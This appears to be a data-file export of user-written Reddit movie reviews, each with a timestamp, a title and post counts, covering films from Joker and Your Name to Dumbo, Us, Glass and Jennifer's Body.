Joaquin Phoenix plays the lead as Arthur with a spectacular performance that is shocking and ominous. Joaquin became this character both physically and on a mental scale. He put raw emotion into the role by how he moves and believes in this reality of Gotham. Joaquin nearly starved himself for the role as he transformed himself into a weak, skinny, and feeble body.  The character has a neurological disorder called Pseudobulbar affect causing uncontrollable laughing at different times of intense emotion. The laugh Joaquin developed was so compelling that it even looked painful. There is even a child-like element to the character in the ways he moves and expresses emotions and desires. He acts on the ways he views other grown men, for he doesn’t always feel like a grown man. This is due to sustaining years of childhood abuse leaving him wanting a childhood. He also walks and moves is very slouched and constricted with his head looking down. However, when killing people he stretches his arms out and looks up having a posture of confidence as he thinks of himself of more of a man. These subtle details lead to a greater performance by Joaquin and shows great talent. 

&#x200B;

Director and writer Todd Philips brings a image of the darkness of Arthur with closed in buildings towering over him and an overall dark color palette. One of the significate elements is the dark staircase Arthur treads up everyday in a depressed manner. The importance comes when we see Arthur transform into Joker in his bright suit dancing on the steps in madness. It’s also symbolic because throughout the film we see overcast and rainy whether, but as Joker dances on the stairs the sun is shining. When it comes to writing this screenplay feels very original in Hollywood, and I like that it’s very detached from the super hero or comic book movies that we see so often. With the upcoming award season I’ve found that this film is deserving of the Academy Award for multiple catagories, and Joaquin Phoenix deserves the best actor award for his spectacular performance. Joaquin has shown his amazing talent over his entire acting career, and has had many nominations. Joker captures the chaos and lunacy of the character Joker in a way that we haven’t really seen before. Philips shows how a disturbed man can become sinister. It’s a image that is new and riveting compared to the repetitive comic book films. It is a modern masterpiece.",moviereviews,3862,670,54,0

Watching it again, after all these years, I still really  enjoyed it. Also Sharlto Copleys take of mad dog murdock still impresses me to this day. Especially because his hit movie before that was distict 9 ( completely different role). Now rampage jackson as Mr. T really wasnt a good fit, they also kind of made BA a wimp in this movie. Bradly cooper, Liam Nelson were perfect casting for their roles. The odd thing about this movie is the extended version is so much better than the theatrical version . All in all the plot is thin, the characters are very entertaining and the action is ridiculous. So if your looking for just a fun film to watch I highly recommend it, if you are looking for something intellectually and intense maybe dont look at a movie based on an 80s tv show.

My ratings are the Tdog scale witch is from 1-12 ( why 12? because it makes no sense and will drive anal people nuts)

So I give this movie a 7, only because its pretty funny and fun to watch.",moviereviews,1470,283,30,0

1567003476.0,Your name (2016) my introduction to Anime,"I don't know where to begin talking abut this movie. This is the fourth time i watch this movie whithin the span of three months, and i am blown away just as much every time. This is probably as close to a perfect film i can think of. I may be a bit biased, since this was my introduction to anime. But i adore this movie. every single second of it. The story, the animation, the music. Everything flows perfectly together. 

The movie revolves around the two characters Mitsuha and Taki. The two live completly different lives, and somehow they start switching bodies with eachother. While they try to figure out why this is happening to them, they have to learn about how the other one lives, and adapt to their lives. It's one of the most inventive ways i've seen to tell a coming of age love story. They have never met eachother, and yet they fall in love. 
The director holds you on the edge of your seat at all time, and never let's go completly. Even when the movie starts to focuses on the dialog and not a lot happens, the intensity keeps you awake. And not to mention how every little detail presented in the start of the movie, get's a payoff in the second half of the movie. The director Makoto Shinkai really knows how to tell a story. 

Boy oh boy is this movie beautiful. Every single shot of the movie is so beautiful. I could gaze upon them for hours. The flow of the animation is so incredible, that i still can't belive it. It feels so natural. Nomatter how many times i watch this, i will never stop being amazed by it.

Last but definitly not last. The music. This is probably.. No. This is my favorite soundtrack for any movie. I've listend to it every single day since i watched it for the first time. I know every song by memory, and i haven't gotten tired of it yet. It's such a big reason for why this movie is as great as it is. Just wow...

As i mentioned at the start; This was my introdction to anime. Uptil i wacthed it, i thought anime was some wierd genre of movies and TV-shows that only those wierd kid's watched. I would like to personally apologize. Not just to you, but to all of those who makes anime. This has since become one of my favorie genres. To think that i just decided that it was wierd and not good, even before i had seen a single anime, baffles me. Anime is it's own artform, and while it is wierd at times, it's still a truly amazing one. 

So in conclusion, this movie is breathtaking. The first time i watched it, about midway through i thought: ""Hey this is pretty cool. I Like this."" Then the movie took a 180, and it blew me away, in the best way possible. I feel like my chest get's so heavy every time i watch it, and i just want to lie down and cry. It just makes me feel so much. I just love this movie, and it's one of my favorite movies of all time.

Go and watch this movie please.

1566879208.0,White chamber (2018) is torture porn,"A movie doesn't have to have Lord of the rings level sets to be amazing. There have been some really good movies that rely on just a few sets, like the saw franchise or infinity chamber. That being said the White Chamber does not compare. 

Most of the move revolves around watching a young woman played by Shauna MacDonald dressed only in underwear being subjected to various kinds of torture. 

And that's it, that's pretty much the whole movie. Sure there are the parts where we get some back ground to explain what is going on but like a 13 y/o boy that just discovered you could Google boobies we keep going back to watching Shauna in her undies writhing in pain.",moviereviews,668,122,11,0
1566239022.0,Crawl (2019),"If anything should be said about horror films of recent years it's that the overuse of jumpscares and lack of imaginative atmospheric aspects dwindle any and all effectiveness of the horror to a laughable degree, so it brings me immense delectation to inform you that at least one more director can make a competent horror movie today. Alexandre Aja gives us a tension filled claustrophobic tale of a father and daughter trapped in a house during a category five hurricane with alligators on the hunt. The story may a bit over the top, but I personally feel it's more believable than a tornado full of sharks (wink). Crawl has typical tropes of a creature feature, but it stands out with it's exceptional cinematography and grounded characters,     —the film has surprising depth and well written character backgrounds for a horror movie—.
The effects never come off as shoddy or cheap, and the performances by both Kaya Scodalario and Barry Pepper are outstanding and seem eerily natural. The film is a breath of fresh air for the horror genre and I reccomend that everybody get the chance to experience it.

1564934290.0,The Kitchen 2019,"Just saw The Kitchen in an early screening and it was pretty awful.

The soundtrack and late 70’s NYC CGI were fantastic, but some of  the acting (well mostly just Tiffany Haddish - stick to comedy Tiffany...)was painful and unbelievable at best, except for Elizabeth Moss who brought it as always. 

The story was choppy, the editing,  color, and dialogue, and overall flow were poorly coordinated.

The Kitchen couldn’t decide if it wanted to be campy or gritty as it reached for that classic Tarantino balance of the two. 

Just another, in a long line, of classic DC Universe adaptions that ruins a great idea with horrible production and continuity.

1564032108.0,"Saw Spiderman Far From Home on release date, Yeah I know its late just felt like writing this review","Spiderman Far From Home is Marvel Studios first movie that takes place after the events of the amazing and historic Avengers: End Game. Spiderman played by the rising young star Tom Holland is back at it again with another adventure, but in a not so spiderman fashion this takes place in different parts of Europe since Peter parker is on field trip with his fellow classmates and of course trouble follows Peter where ever he goes. Now the main plot revolves around how the world is moving forward after the tragic demise of the late and great avenger Tony Stark and as a result people are looking for the next big Avenger to fill that void and that person is no one other than Spiderman. The writers and Tom Holland do a great job of portraying Peters main struggle to live up to the great Tony Stark, its bad enough to have to live up to such high expectations and if you add in the fact that Peter is only a 16 year old teenager in High School one can only imagine how much pressure and anxiety that must come with.Through out the film Peter is constantly reminded of this by subtle things wether its the media or a mural some where outside. So, is the movie any good? The answer is........  yes. Sony and Marvel pull out another hit with this spiderman film even though the film has its flaws, For example there are certainly some sub plots with certain characters that were completely unnecessary and were basically in the film the whole time for comedic purposes and even then some of those scenes were a hit or miss, but the film definitely could've done with out them. Now on to Jake Gyllenhaal as the mysterious new hero Mysterio if you're a fan of comics or anything related to spiderman you would know that Mysterio is usually the villain and spoilers ahead he is in fact the villain in the film. Jake did an amazing job and really reveled in this character, but I just wished they did a better job of flushing out his character a bit more. As some people know a lot of marvel villains are hit or miss and if anyone, but Jake played this role it might have been a miss, but in the end he was just fine as a villain. I really wished his character was on screen more and had more of a purpose like the last villain from homecoming, but the pacing of the movie mixed with the great action sequences and well timed comedy hits its mark. From start to finish this movie felt very entertaining and the 2 hrs flew by. As for the rest of the Cast Zendaya playing MJ had more time on the screen and had great chemistry with costar Tom Holland and yes the teenage antics and romance can be a bit cringe at times, but for the most part I thought it was pretty cute. Samuel Jackson plays Nick Fury and basically does Nick Fury things during the movie and as for Ned he also does a good job and has some great comedic lines, but sadly he's more of a wingman role this time around and not so much of a chair guy role, maybe next time. Overall I loved the movie I would definitely watch it again and of course this should be obvious at this point, but STAY FOR THE CUTSCENES!!!!! I give this movie a solid 8.7 out of 10.",moviereviews,3117,591,47,0
1562131316.0,Saw Aladdin!,"This movie was a bit better than I expected it to be!

I have only seen the original a few times, mostly because it's just not a film I think about and I am not really a fan of it. This movie did a very decent job with redoing the story in its life action format!

The acting was good! I mean, it was nothing groundbreaking but for a Disney movie that was a remake of the original, it was pretty good! Will Smith KILLED....it as the Genie! He did such a wonderful job and considering he was doing his own thing while not at all copying Robin Williams, even better. He was easily the number one best part of the movie and his musical sequences were actually pretty awesome and catchy! I did not expect his singing to be as good as it was, unless during filming it sucked and the editors are very skilled! His cgi was good, except his face just looked off....but was acceptable. He did great! Naomi Scott....she NAILED IT..... Her performance for this kind of movie was really great and her musical performances were hypnotic.... She is the second best thing! Mena Massoud also did well, but wasn't QUITE a standout.... And his singing wasn't AS GOOD as Will's or Naomi's but it is decent! His performance was pretty decent, him and Naomi did have really good chemistry, and they both played each other off during their musical sequences very well, but Naomi was better than him imo again, he was still decent. 

Marwan Kenzari......was not....good at all in this movie.... He was VERY poor casting. I mean, he did.....okay with his performance, but he was not AT ALL intimidating....

The story was pretty intriguing, but nothing groundbreaking. We all know what the story is. It's just told again in this version.

Visuals were absolutely gorgeous! The lighting, atmosphere, CGI, everything was really impressive!

Overall: 7/10. It's nothing groundbreaking, excluding Will Smith, Naomi Scott, songs, sets, and cinematography, and Aladdin in general is not a favorite of mine at all, this was still a lot of fun though!",moviereviews,2019,354,102,0

So many missing things with too little emotion. You removed the iconic parts and tried to make something different and ""quirky."" 

You even ruined Pascow, first of all, the makeup was so poorly done. Pascow had an actual part in the story, he was iconic. Can I get whatever these people were smoking to actually find this movie decent? This movie wasn't even creepy or scary and had to use truck jumpascares

Zelda was extremely creepy in the original, even petrifying. Zelda was just used for PTSD in this one. Judd had almost no point apart from showing the ""oh boy so spooky"" burial ground. Also, ""the ground is sour"" was used, what? 2 times? That line was so important, but no.   
There was added crap that was stupid and unnecessary, such as the children with masks. They had no point and meant nothing to the story, as with the masks. The scalpel from the first movie was iconic and was the main weapon that was used by Gage. It was used to kill Judd and was used like a hacksaw to cut his tendon from the inside out while in the first one, Gage slit into it, not out. Pascow actually had an impact in the first one, impacting how the mother got back home. The grandfather from the first one knocked over the casket in anger of the father, that was ICONIC. But didn't occur in this one. 

Oh yea, Gage, he was SUPPOSED TO DIE. It's not that I like to see children die, but he was so important. He was an amazing antagonist, and even in the end there was a huge showdown. Not this one, this had no real fight, and was bland. Not satisfied in the least.",moviereviews,1697,319,55,0
1554210553.0,Dumbo (2019) - SPOILER-FREE Review,"If you enjoy reading my spoiler-free reviews, please follow my blog @ [MSB Reviews](



1941’s ***Dumbo*** was never a favorite of mine. It’s a great movie with a sweet message (as most ***Disney*** flicks), but I was curious to see how a remake of a 60-min film would develop. Obviously, changes to the story not only will occur, but they need to. People have to stop desiring these live-action remakes to be a literal copy-paste of their originals and start being fair to these movies. Pure animation is different from live-action, and the latter provides a much more realistic environment than the former, so it’s evident that every remake they produce will have some “updates” in the more “silly” aspects.

Furthermore, I’ve witnessed a couple of “critics” hating this ***Dumbo***. Hating! Calling it one of the worst films of the year! Now that’s a strong feeling to have against a movie that improves so much regarding its original. Yes, it has a bunch of narrative issues, and the dialogues can be cringe-worthy, but hating this 2019 remake while defending the original as it was some kind of masterpiece is ridiculous. Complaining about the 2019’s ending when the 1941’s is absolutely inadmissible is being a hypocrite. Whining about **Dumbo** not being 100% the star of the show when the original has the elephant discover his flight abilities four minutes before the end is dumb. In addition to that, this film runs for twice the original’s runtime! What did you expect?! That human characters wouldn’t be a necessary modification? 

Some “critics” are even complaining about animal abuse or their unnecessary exploration … Are they joking?! Have they seen the original? Do they remember how racist it was? How discrimination was treated as comedy? Even alcohol was handled as a plot point for God’s sake! 2019’s ***Dumbo*** barely has any animal violence, and its final message is against animal captivity or exploration, so any person who criticizes this ending is either a despicable human being or not a fan of the original ***Dumbo***, at all.



Enough about those “critics”. I feel sick just remembering what they wrote/said. Unfortunately, 2019’s ***Dumbo*** does have a lot of screenplay issues. There’s no way of denying it. The human characters are filled with cliche storylines and child-written dialogues. I know that analyzing children’s acting is not exactly a fair critic, but I’ve seen so many remarkable young actors nowadays, who make *Nico Parker* and *Finley Hobbins* performances look not that good (their scripts also don’t help). The visual style characteristic of *Tim Burton* is definitely present, even if its magic becomes overwhelming at times. 1941’s ***Dumbo*** was very concentrated in one small location contrary to its 2019 remake where **V. A. Vandevere**‘s park feels like Disneyland.

The stiff dialogues don’t help the movie’s pacing, and its tone could be better balanced. Nevertheless, just the opportunity to watch such a gorgeous, magnificent, and visually jaw-dropping live-action elephant come to life is absolutely delightful and entertaining as hell. When a character like **Dumbo** makes you cry when he’s crying, makes you feel sad when he’s feeling sad, makes you happy when he’s feeling happy, that’s when you know the visual effects team has reached a point where live-action is pretty much reality. The little elephant looks like an adorable little elephant. I mean, what better compliment can I give a live-action character than “it looks and feels real”?

Even with the issues mentioned above, it’s still a heartfelt story, filled with emotional moments, and a wonderful message. Technically, it might lack consistency and some overall quality, but I end up enjoying myself. Experiencing **Dumbo**‘s pain, happiness, and his bond with the kids flourish is special. *Colin Farrell* and *Eva Green* deliver good performances, and their character arcs, cliche as they may be, still carry some efficiency. There’s a wrong vibe surrounding the word “cliche”, like it’s a bad thing. Not at all! Something being cliche just means we’ve seen that before a lot of times, it doesn’t mean we’ve seen it performed better or worse. ***Dumbo*** is a remake of a very influential 1941 film, so obviously, cliches are a certainty. It’s a ***Disney*** tale, after all. 



In the end, cliche as it might be, 2019’s ***Dumbo*** improves on a lot of aspects of its predecessor. I do believe these movies are almost incomparable since the dimension, runtime, and even the main plot are surprisingly (or not) different. Still, not remembering or even acknowledging the original not only is an absolute flaw, but it can ultimately make you a hypocrite, so be careful with what you write/say. I understand a person not enjoying this film or not liking it as much as I did, but if you hate (!) it, you better give me good enough reasons.

**Dumbo** is probably the most visually stunning and incredibly realistic live-action character ***Disney*** was able to produce so far. This little elephant alone is worth the price of admission. His arc is way bigger and complex than the one in the original, which can either delight or disappoint you. To me, it not only worked, but it finished strong and way better than the original. It’s upsetting that the screenplay couldn’t accompany *Burton*‘s impressive visual style, even if overwhelming at times, as well as the human characters who feel a bit detached from the actual story to tell. It’s still a good time at the movie theater, so go see it!

1553586192.0,Us (2019); Theory and Explanation,"Everything stated in the following Review/Theory is my own personal opinion. Feel free to correct me if I have stated something incorrect, or even post your own opinion(s) on the film below, I love discussions. First and Final warning: THIS POST CONTAINS SPOILERS

So, if you are like 80% of the American population, including myself, you went to see the writer of Get Out's newest film, Us, this weekend. For those of you that don't know, Us was written by Jordan Peele. Though still more commonly known as ""that guy from Key and Peele,"" Jordan Peele is quickly becoming one of the best writers in the new age of horror films.

Even after the remote success of Get Out, Peele has delivered an even more successful thrilling mind-fuck of a movie. If you thought Get Out had you asking questions, you have another thing coming. The film starts with a small family, with only one daughter, enjoying a trip to an amusement park on the beach in 1986. When the Mother decides to leave her daughter with her clearly oblivious husband so she can use the bathroom, the young girl, named Adelaide, wonders off to the beach by herself.

This is where the most important part of the film takes place, though you don't know that until much later. What seems to be a simple first-time encounter with the future antagonist, is actually what causes the entire movie to unravel in the way it does. The girl finds herself in a house of mirrors when the power goes out, forcing her to wonder around the dark, narrow paths of the fun house to try to find her way out. She instead stumbles upon another young girl who looks identical to herself, who's first reaction is apparently to strangle her into unconsciousness. After doing so, the dark version Adelaide drags her unconscious doppelganger back to what we learn to be her world, which is hidden below an old fun house on a beach in Santa Cruz. Dark Ade then handcuffs her above-world self to what we can only assume is her bed, and returns to the surface world herself, forcing the two to swap lives.

This is pretty much the last bit of information the film gives you, leaving you to rerun the movie over and over in your head trying to decide what you’ve ACTUALLY learned. Well sense I haven’t been able to stop thinking about it since I stepped out of the movie theater, I figured I might as well write down what I think to be somewhat of an explanation. Of course, I don’t have any actual proof that any of what I’m about to say is true, so this is more of a theory than an explanation. But for now let’s run through some questions probably running through your head, and hopefully my ideas and thoughts on the subject help shed some light or at least give you something more to think about while searching for the answers:

Who are these clones, and what do they want?

By far the biggest question twisting around in your skull is probably who the hell these clones are and where they came from. The clones refer to themselves as “The Tethered,” which is a word usually used by hunters when tying an animal to a tree or something similar. This automatically implies that the clones are connected to something, but that’s fairly obvious seeing as though they’re, well… clones. During the first actual discussion between both versions of Adelaide, the clone (or original, I guess I should say), named Red, mentions that the clones were “made by man as a way of controlling the ones above” but were abandoned. This tells us that the premise of the film isn’t paranormal or other-worldly, but in fact science related. Which also explains the odd amount of rabbits in the world below, as they were probably what were used for testing when perfecting the cloning the process. Though this is a bit of useful information, it only rises more questions that seem pretty unanswerable;

· Why were they created in the first place?

I would guess the clones were created in order to somehow control the citizens of America, or with the idea in mind to completely replace the population. During an interview about the film, Peele mentioned that the meaning behind it falls back more on our country’s fear of the unknown. Our fear of foreigners and other forces unlike ourselves in anyway. He states that sometimes we need to take a step back and realize that the real enemy is us. I believe there is more to it, however. It seems to me that these clones are symbolic of what the government wants us to be; Mindless bodies that will live easily without questioning the powers above, and will simply just be happy to be alive, rather than worrying what they (the government) are up to. This is what leads to me believing that maybe the original plan for the cloning experiment was to replace the entire population (or maybe even just a large portion of it) in order to have more control over the country. My guess is that the experiment was deemed a failure when most of the clones were coming out nothing like their originals (For example Pluto was born to love fire, which probably stems from Jason’s love of magic, but with a dark twist).

· How did Dark Adelaide know about the world above?

The only answer I have for this is simple; she didn’t. The clones seem to be very, very stupid, but have a strong ability to learn. Which would not only explain why the experiment was a failure, but it would also explain how the original Adelaide was able to train them so easily and become the leader of the clone-purge, also known as the “Untethering.” As you can see in many parts of the film, Red uses hand motions and quick sounds to basically order around the rest of her “family.” Which would make sense seeing as though she’s the only original living in a world of clones, also explaining why she’s the only clone that can talk. But back to the question at hand; I believe the clones are able to feel the same emotions as their originals, without experiencing the cause. Because of this, mixed with their lack of intelligence, the clones are basically forced to reenact what the originals are doing, that way they have a reason to feel the way they do. This would explain why the mindless doppelgangers spun around in circles while their originals enjoyed rides on the surface, or why Umbrae was able to run very fast, with her original (Zora) being a track star.

It seems to me that the Dark Adelaide felt the same feeling of curiosity as the original when hearing the crack of thunder coming from the beach. This led them both to stumble upon something they didn’t expect and, both being literally equally curious, they had to explore. Why Dark Adelaide’s immediate response was to strangle herself, kind of, I’ll never truly understand, as she hadn’t even seen the outside world in order to understand everything yet. But maybe this hints to them knowing more than we’d expect about the world above? That and Red’s story. Other minor points can also be noticed when keeping this in mind, like how Pluto didn’t know about the closet locking from the outside (proving that even if they share emotions, the clones are not able to actually view or understand exactly what the originals are doing), or how the clones weren’t just automatically able to know every move the originals were going to make. So, they’re not entirely connected mentally. What this doesn’t answer, however, is how the clones were able to find out where their originals lived, or how they knew enough about their lives to destroy them. My only guess on this is that after Red began the planning for the Untethering, the clones spent a lot of time spying on and studying the lives of their originals. Though the clones seem very unintelligent, it would make sense that they have an easy adaptation to learning as whoever created them probably wanted to force them to learn how to be EXACTLY like their originals, which stems back to why the project probably failed in the first place.

· How should you feel?

If you’re like me, you probably left the theater with a small sense of disappointment, without being able to pinpoint why. This was actually done on purpose. Peele stated during an interview that, similar to Stanley Kubrick’s film rendition of Stephen King’s The Shining, everything that happened or that is even placed in the movie is there for a reason. I believe Peele didn’t want you to feel like anyone had necessarily won in the end. The person you were routing for the entire time turned out to be the clone all along, but was she really in the wrong? Was Red in the wrong? Peele is forcing you to ask the question of who the actual enemy is and wants us to think about the fact that it’s all about perspective. Everyone is the enemy. Both Adelaide and Red had reasons to do what they did, but does that make either of them right? By the end of the movie you should be pondering more about the the fact that as humans we expect everyone who is different than us to be the enemy, which in turn makes US the enemy to someone else. So, who really is the bad guy?

Overall, in my opinion, Peele has definitely 1-upped himself after the release of Get Out by delivering a much more universally terrifying thriller that leaves us all guessing who’s side we should be on. Nothing has made me more afraid of my own reflection as I walk by a window or the dark ideas of government experiments and the possibility of these experiments back firing. What do you guys think? Do you believe my theories to be true, or do you have a different idea of what could truly be going on in the innerworkings of the world of Us?",moviereviews,9523,1713,167,0
1552191767.0,Analysis and Review of Captain Marvel,"The MCU has grown to be highly enjoyed film franchise in the last few years. When one movie seems to have slow the franchise there is a follow up that seem to kick butt. Even some of the more lack luster entries give background additions to the overall franchise. Take Thor 2 for example, in this entry there is the reveal of one of the Infinity Stones. When we get to the latest entry, Captain Marvel, we are given more background to a somewhat lack luster addition, story wise. 

The movie also works as a fun way to develop parts of the MCU. Somethings we didn’t need to know, like how Nick Fury lost his eye or what happened to the Tesseract between movies. Fury’s eye is interesting but not needed. The same is said about the Quin Jets that are used in other MCU movies. Captain Marvel also gives a proper introduction to a race of aliens that have been popping in and out of the Guardians of the Galaxy side of the MCU, the Kree. There is also a first introduction another alien race, the Skrull. Both introductions have been long awaited by fans of Marvel Comics. 

While the story has less character development for Carol than we have seen in past. What is forgotten is some of the character development in the MCU occurs through multiple movies. Tony Stark for example starts his growth in the Iron Man and it continues into Infinity War. If this approach is taken for Carol, then she will continue to grow as a character in the future. However, in Captain Marvel she starts out as Vers a stoic warrior who doesn’t know where she comes from. By the end she is a sometimes-witty stoic hero known as Captain Marvel/ Carol Danvers. 

While the main theme of the movie is Carols self-discovery. There was a second theme of good vs. evil. While she starts out as Vers, Carol works with the Kree group Starforce fighting the Kree, who are terrorist. However, a plot twist changes this up. The plot twist however, is not handled very well and is revealed rather mutely. Now this is getting into spoilers, Jude Law’s character is a large problem with the plot twist. The way his character holds himself leads to be seen more as an opposing force for Carol from the beginning. 

Now there are a few minor flaws with the movie that stood out. Most can be overlooked due to the nature of the movie, comic book movie and prequal to the 2019 summer movie season. One flaw that they brush to the side in the movie is the faith and trust between different characters. This comes into play since the Skrull are shapeshifters. There are parts in the movie where Carol and Fury split up and come back together after they deal with a group of Skrull. This leads them to testing each other’s faith and trust in each other. One of the first time this happens is just after they meet for the first time. They give each other facts they know about themselves that neither can verify and move on. The main problem is that one could have been Skull making up facts. Another flaw is the support characters that haven’t been seen in the MCU before, run the risk of not having their names remembered. For most audience members they might come out not remembering character names, past Fury and Carol. Looking back at past MCU movies there are similar the faith and trust sections are handled better. However, movies that have similar themed sections one or more characters have deadly motivations to do so. Take Tony Stark for example, when he is in the cave building his first suit. In this section he puts trust and faith into Yinsen, his fellow cell mate, in order to safely build the suit. The reason that the faith and trust sections of Captain Marvel didn’t fully work was that neither side was in full danger, everyone involved will survive.

Despite these flaws the movie is rather enjoyable for the 21st outing into a cinematic universe. Not only is it enjoyable it sends a good message to kids: no matter how many times you get knocked down you, you should get back up, dust yourself off and go again. 

Oh yeah, SHIELD is the MCU’s MIB.",moviereviews,4028,732,71,0
1548447941.0,"Glass: A decent thriller, but disappointing conclusion to an unexpected trilogy","  

Walking into *Glass*, the final chapter of a trilogy by M. Night Shymalan, I was going into a movie I not only was very anxious and excited to see, but also one I never thought would be made. I was seven when *Unbreakable* came out, and found myself bored after the first viewing. Watching it a few more times over the years, I gained more respect for it and eventually ended up enjoying the movie after understanding it more. Fast-forward 16 years to *Split,* a movie I loved from the first time I watched it. With that reveal at the end connecting the two movies to the same world, there was one question on my mind: what will they do with the story now? The answer: not much, unfortunately.

*Glass* takes place shortly after the events of *Split.* The Horde (McAvoy) is still on the loose and has captured a group of four cheerleaders, looking to repeat his process. We are re-introduced to David Dunn (Willis), who has become a vigilante and has set his sights on the Horde. They eventually meet up and have their showdown, but are then captured by the police and Dr. Ellie Staple (Paulson), and are committed to a psychiatric hospital. Once there, it is revealed that Mr. Glass (Jackson) is a patient there, albeit heavily sedated (but not really). Much of the rest of the movie is Dr. Staple trying treat their “condition” where they all believe they are superheroes. Meanwhile, Glass is working on a sinister scheme to get them out and show the world what they really are.

The storyline is relatively simple, and the movie is very contained, only taking place in a few locations. Most of the events are conversational, with a few fight scenes and showdowns scattered around, mainly at the beginning and end. All in all, the tone of it was much more like *Unbreakable* than *Split*. The conversations and interactions between the characters was the most intriguing part of the film, and what I ended up enjoying the most. The performances were also terrific, with one exception. Jackson and Paulson are great as usual, but the standout is James McAvoy. The way he can seamlessly transition between all of the vastly different personalities, many times without any cuts or editing, is simply incredible, and I truly wish he would get more awards recognition for his performance. 

Where the movie falls apart, however, is three different aspects: the ending, the fights between Dunn and The Horde, and the performance of Bruce Willis. First, Bruce Willis seemed so checked out of the movie, and didn’t really do anything of note in his performance, which transferred over to his character in the movie. Dunn doesn’t do much throughout the movie, and just comes across as flat. Along with that, when Dunn and The Horde do fight, it’s not the spectacular showdown I was wanting it to be. The fighting consisted of just a lot of pushing and shoving, and has a lot of odd POV shots of the faces as their fighting. With the disappointing showdown, the Shymalan twist that comes in at the end (not a spoiler since everyone knew there’d be one), comes out of nowhere and kind of makes a lot of what happened in the movie pointless. There is a smaller twist/reveal earlier in the movie that was much better, and had they stuck with that and changed up some later events would have made the ending more satisfying and the movie better overall. I understand that Shymalan is expected to have the big twist at the end, and feels he needs to up the stakes each time, but this one felt so forced that it seemed like more of an afterthought rather than weaved in through the movie like some of his better twists.

Overall, *Glass* is not a bad movie and had a lot of good things going for it, but it was just disappointing in other aspects and wasn’t the fitting conclusion to the trilogy it was set up to be. I think a few changes to the third act and finale would have improved the film and made it come together in a more fitting way.

1546752346.0,Unbreakable Is An Underrated Classic!,"""What If Superman Was Right Here On Earth, But Didn't Know He Was Superman?"", asks filmmaker Quentin Tarantino. That question has intrigued me so much, that I had to view this movie. 

Superhero stories are nothing new, but this superhero story is not only a semi-realistic supernatural thriller, but it's also a poignant cinematic experience and a riveting character study, riddled with superhero themes, comic book tropes and archetypes, and unique cinematography. 

David Dunn (Bruce Willis) is a melancholy security guard who is the only survivor of a horrific train derailment.  After the incident, with the aid of a physically disabled comic book art dealer Elijah Price (Samuel L. Jackson), David learns that he has superhuman abilities. 

The film follows David as he and Elijah try to find the reason for their existence while keeping each other's lives in check.

Bruce Willis' performance as David Dunn and Samuel L. Jackson's performance as Elijah Price, also known as Mr. Glass, due to being born with a rare disease that causes his bones to easily break, are phenomenal (mostly the latter). 

Unbreakable is one of my favorite superhero movies of all time, besides Josh Trank's Chronicle. 

Unbreakable earns an 8.5/10. Thanks for reading. Yippee ki yay!",moviereviews,1268,204,38,0

1531581151.0,"A Review of ""How It Ends"""," So now that it's not 2 in the morning, here's a little mini review of How It Ends on Netflix. The beginning is very cliche. A guy gets his girl pregnant, so he goes to Chicago to....ask her dad for permission to marry her? (that's still a thing?) Anyway, shockingly, her dad hates him(You took my daughter to live in Seattle to get away from me! WAH!) . The dad is also exmilitary so you can see every bit of dialogue he's going to say a mile away. So when the world goes nuts, for a reason NEVER explained, the guy and the dad have to go on a road trip back to Seattle to find said girl. On the plus, the movie LOOKS great and there's some great car tricks. But it's mostly boring. Which suuuuuuuuucks. The movie likes introducing characters and then just basically have them walk off into the sunset, never to be seen or mentioned again. But the frustrating thing with that is that they start to establish the character and then they just have them dosey-do right the fuck on out of the movie. The biggest crime (and this is so common in disaster movie's these days) is the disaster is SO ambiguous, that it makes it very unrelatable. Nuclear bomb? Failed weapons test? Asteroid? Aliens? Who the hell knows! It just makes for interesting landscapes to look for more gas for the car in. And I ruin nothing by saying this, the ending is just a cut to credits. No resolution. No loose end clean up. No dues ex. Just them out running a cloud of ash and BOOM, roll credit. If it wasn't on netflix, I wouldn't recommend it. But it's good background noise if you want to something on while you clean your living room. Small addendum: It WAS acted very well though, which is saying something because the writing was atrocious.  ",moviereviews,1723,320,57,0
1666634949.0,Source Code (2011) - Review,"""Despite hearing many positive reviews for Source Code over the years, this was always a movie that seemed to escape my mind. So after finally getting to it and giving it a watch, I can now say that I understand the adoration for this movie. Source Code is a fantastic science fiction action thriller that handles its repetitive nature well to create a contemplative and thoughtful story. Of course with most sci-fi films, you have to be open to accept a certain level of unbelievability and Source Code is no exception. That being said, Jake Gyllenhaal is an absolute powerhouse as he stars as the lead of this film while Vera Farmiga, Jeffrey Wright, Michelle Monaghan (and a very random cameo from Russell Peters) act as suitable supporting characters.""

With Halloween quickly upon us, I'm sure you've been wanting, possibly even craving, some spooky content to perfectly match the holiday season and get you in the festive mood. I love October because for me, it kind of signals the start of all the upcoming holidays to look forward to. Unfortunately for me, while I'm a big fan of celebrating holidays (Christmas is my personal favourite) and I do love Halloween spirit, I am a massive scaredy cat. You may have put two and two together and realized Halloween isn't really a great holiday for me, and even more so, scary movies are really not for me. But hey! That doesn't mean I can't enjoy some Halloween-themed movies - and if you get scared easily like me, that doesn't mean you can't either!

So for all you fellow scaredy cats, I've compiled a fun list of some of my go to Halloween favourites that are great watches AND won't give you a heart attack. I've categorized my list into three tiers: easygoing and festive, tolerably spooky, and lastly, a ""we're potentially testing your limits here"" kind of scary.

1665202873.0,*Mostly Spoiler-Free* Jennifer’s Body Review,"Jennifer’s Body

Quick Synopsis
A hot high schooler gets turned into a succubus.

This movie was SOMETHING.
It’s hard to explain beyond “you’ll know within ten minutes if this movie is for you or absolutely not for you.” It leans into the occult campy horror with the sharp humor and unexpected wit of 80s and 90s Teenage Romantic Comedies. 
I chuckled more than I expected at lines that were very witty, and then I also chuckled hard at lines that should’ve been awful. 
Yet somehow it works.

The cast is having a lot of fun in their characters and it makes all the difference. Amanda Seyfried is a strong final girl lead and plays the part of a paranoid teenager with identity issues well.
I give props to Megan Fox for going balls to the wall INTO type and then past the solid wall. JK Simmons and Adam Driver were surprising and welcome inclusions.

The sexual overtones were expected in a movie called Jennifer’s Body, but the level of overt overtone was unexpected at parts to the point where my brain was asking “What kind of movie am I watching right now?” as I breathed super deeply and audibly.

As a teen from the 2000s, the soundtrack was almost cheating. Dead-on punk-alt style of my youth. The only exception was the featured fake movie band “Low Shoulder”; I couldn’t tell if they were supposed to suck on purpose but by God did they hit that mark.

The special effects were great and consistent.  The physical ones, especially the pool scene and the fire stunt, were very impressive.

One shortcoming was the scene cuts. In film it’s common to go from dark-to-light suddenly to throw off the audience’s equilibrium and mess with them in some ambient confusion. That said, eight to ten times in a 100-minute movie becomes quickly overused and annoying.

The story itself is nothing amazing but cult enough that this should be a Halloween season staple so long as it’s a movie for you.

Will gladly watch again.

